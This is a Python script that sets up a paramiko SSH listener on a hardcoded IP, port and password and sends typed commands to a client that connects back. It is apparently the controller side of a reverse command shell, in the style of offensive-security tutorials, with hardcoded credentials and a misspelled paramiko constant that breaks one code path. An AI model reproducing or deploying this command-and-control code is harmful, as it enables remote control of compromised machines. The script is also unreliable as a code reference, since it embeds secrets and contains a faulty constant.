#!/usr/bin/env python3
# -*- coding-utf-8 -*-

import os
import re
import sys
import time
import glob
import json
import queue
import getopt
import base64
import socket
import string
import logging
import difflib
import textwrap
import binascii
import argparse
import threading
import subprocess
import multiprocessing
from io import BytesIO
from pathlib import Path
from datetime import datetime
from random import randint as rand
from random import choice as choice
import fire
from loguru import logger

import pywifi
import paramiko
import requests
# import mysql.connector
from pywifi import const
from lxml import etree, html
from ds_store import DSStore
from bs4 import BeautifulSoup
from selenium import webdriver
from colorama import Fore, init
from urllib.parse import urlparse
CUR_FOLDER = Path(__file__).parent.resolve()
from http.server import HTTPServer, SimpleHTTPRequestHandler


import sys
import socket
import paramiko
import threading

# server = sys.arv[1]
server = '202.100.1.224'
# ssh_port = int(sys.argv[2])
ssh_port = 6868

host_key = paramiko.RSAKey.from_private_key_file(filename = 'id_rsa.key', password = 'Cisco123')

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PAROHIBITED
    
    def check_auth_password(self, username, password):
        if (username == 'qytanguser') and (password == 'qytangccies'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    
def main():
    global server
    global ssh_port
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print("[+] Listening for connection ...")
        client, addr = sock.accept()
    except Exception as e:
        print("[-] Listen Failed: " + str(e))
        sys.exit(1)
    print("[+] Got a connection")

    try:
        bhSession = paramiko.Transport(client)
        bhSession.add_server_key(host_key)
        server = Server()

        try:
            bhSession.connect(server = server)
        except paramiko.SSHException as x:
            print("[-] SSH Negotiation failed.")
        chan = bhSession.accept(20)
        print("[+] Authenticated!")
        print(chan.recv(1024))
        chan.send("Welcome to bh_ssh")
        while True:
            try:
                command = input("Enter command: ").strip('\n')
                if command != 'exit':
                    chan.send(command.encode())
                    print(chan.recv(1024).decode())
                else:
                    chan.send('exit')
                    print("exiting")
                    bhSession.close()
                    raise Exception('exit')
            except KeyboardInterrupt:
                    bhSession.close()
    except Exception as e:
        print("[-] Caught exception:" + str(e))
        try:
            bhSession.close()
        except:
            pass
        sys.exit(1)


if __name__ == '__main__':
    main()

